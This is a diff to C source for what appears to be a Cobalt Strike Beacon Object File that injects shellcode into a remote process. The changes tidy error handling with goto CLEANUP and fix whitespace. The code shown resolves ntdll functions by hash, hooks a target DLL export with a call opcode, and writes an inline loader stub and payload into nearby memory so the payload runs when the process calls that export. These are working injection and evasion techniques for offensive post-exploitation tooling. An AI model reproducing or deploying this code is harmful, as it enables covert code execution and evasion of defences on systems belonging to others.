@@ -85,7 +85,7 @@ FARPROC _GetProcAddress(_In_ HMODULE dllBase, _In_ ULONG funcHash)
 
 void GenerateHook(UINT_PTR originalInstructions, char* shellcodeLoader)
 {
-    for (int i = 0; i < 8; i++) 
+    for (int i = 0; i < 8; i++)
         shellcodeLoader[18 + i] = ((char*)&originalInstructions)[i];
 }
 
@@ -135,9 +135,9 @@ void go(char* args, int alen) {
         0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
         0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
         0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
-        0xE0, 0x90 
+        0xE0, 0x90
     };
-    
+
     // Get address of target function
     HMODULE dllBase = _GetModuleHandle(HashStringA(targetDllName));
     if (dllBase == NULL)
@@ -162,8 +162,8 @@ void go(char* args, int alen) {
     typeNtAllocateVirtualMemory pNtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtAllocateVirtualMemory);
     typeNtProtectVirtualMemory pNtProtectVirtualMemory = (typeNtProtectVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtProtectVirtualMemory);
     typeNtWriteVirtualMemory pNtWriteVirtualMemory = (typeNtWriteVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtWriteVirtualMemory);
-    typeNtClose pNtClose = (typeNtClose)_GetProcAddress(ntdllBase, HashStringNtClose );
-    
+    typeNtClose pNtClose = (typeNtClose)_GetProcAddress(ntdllBase, HashStringNtClose);
+
     if (pNtOpenProcess == 0
         || pNtAllocateVirtualMemory == 0
         || pNtProtectVirtualMemory == 0
@@ -195,7 +195,7 @@ void go(char* args, int alen) {
     if (loaderAddress == 0)
     {
         BeaconPrintf(CALLBACK_ERROR, "Unable to locate memory hole within 2G of export address");
-        return;
+        goto CLEANUP;
     }
     //BeaconPrintf(CALLBACK_OUTPUT, "Allocated region @ 0x%llx", loaderAddress);
 
@@ -214,7 +214,7 @@ void go(char* args, int alen) {
     if (status != 0)
     {
         BeaconPrintf(CALLBACK_ERROR, "Unable to change page protections @ 0x%llx, status: 0x%llx", targetRegion, status);
-        return;
+        goto CLEANUP;
     }
 
     // Calculate callOpCode & write to export
@@ -222,24 +222,24 @@ void go(char* args, int alen) {
     char callOpCode[] = { 0xe8, 0, 0, 0, 0 };
     for (int i = 0; i < 4; i++)
         callOpCode[1 + i] = ((char*)&relativeLoaderAddress)[i];
-    
+
     ULONG bytesWritten = 0;
     targetRegion = exportAddress;
     status = pNtWriteVirtualMemory(pHandle, (PVOID)targetRegion, (PVOID)callOpCode, sizeof(callOpCode), &bytesWritten);
     if (status != 0 || bytesWritten != sizeof(callOpCode))
     {
         BeaconPrintf(CALLBACK_ERROR, "Unable to write call opcode @ 0x%llx, status: 0x%llx", exportAddress, status);
-        return;
+        goto CLEANUP;
     }
     //BeaconPrintf(CALLBACK_OUTPUT, "Wrote call opcode @ 0x%llx", exportAddress);
-    
+
     // Change loaderAddress protections to rw
     regionSize = sizeof(shellcodeLoader) + shellcodeSize;
     status = pNtProtectVirtualMemory(pHandle, (PVOID*)&loaderAddress, &regionSize, PAGE_READWRITE, &oldProtect);
     if (status != 0)
     {
         BeaconPrintf(CALLBACK_ERROR, "Unable to change page protections @ 0x%llx, status: 0x%llx", loaderAddress, status);
-        return;
+        goto CLEANUP;
     }
 
     // Write payload to address (2 writes here because I cba to concat the two buffers)
@@ -247,14 +247,14 @@ void go(char* args, int alen) {
     if (status != 0 || bytesWritten != sizeof(shellcodeLoader))
     {
         BeaconPrintf(CALLBACK_ERROR, "Unable to write loader stub @ 0x%llx, status: 0x%llx", loaderAddress, status);
-        return;
+        goto CLEANUP;
     }
 
-    status = pNtWriteVirtualMemory(pHandle, (PVOID)(loaderAddress+sizeof(shellcodeLoader)), (PVOID)shellcode, shellcodeSize, &bytesWritten);
+    status = pNtWriteVirtualMemory(pHandle, (PVOID)(loaderAddress + sizeof(shellcodeLoader)), (PVOID)shellcode, shellcodeSize, &bytesWritten);
     if (status != 0 || bytesWritten != shellcodeSize)
     {
         BeaconPrintf(CALLBACK_ERROR, "Unable to write payload @ 0x%llx, status: 0x%llx", loaderAddress + shellcodeSize, status);
-        return;
+        goto CLEANUP;
     }
 
     // Restore original protections
@@ -262,11 +262,13 @@ void go(char* args, int alen) {
     if (status != 0)
     {
         BeaconPrintf(CALLBACK_ERROR, "Unable to change page protections @ 0x%llx, status: 0x%llx", loaderAddress, status);
-        return;
+        goto CLEANUP;
     }
 
-    BeaconOutput(CALLBACK_OUTPUT, "Injection complete. Payload will execute when the targeted process calls the export", 84);
-    pNtClose( pHandle );
+    BeaconPrintf(CALLBACK_OUTPUT, "Injection complete. Payload will execute when the targeted process calls the export");
 
+    CLEANUP:
+        pNtClose(pHandle); pHandle = NULL;
     return;
 }
+
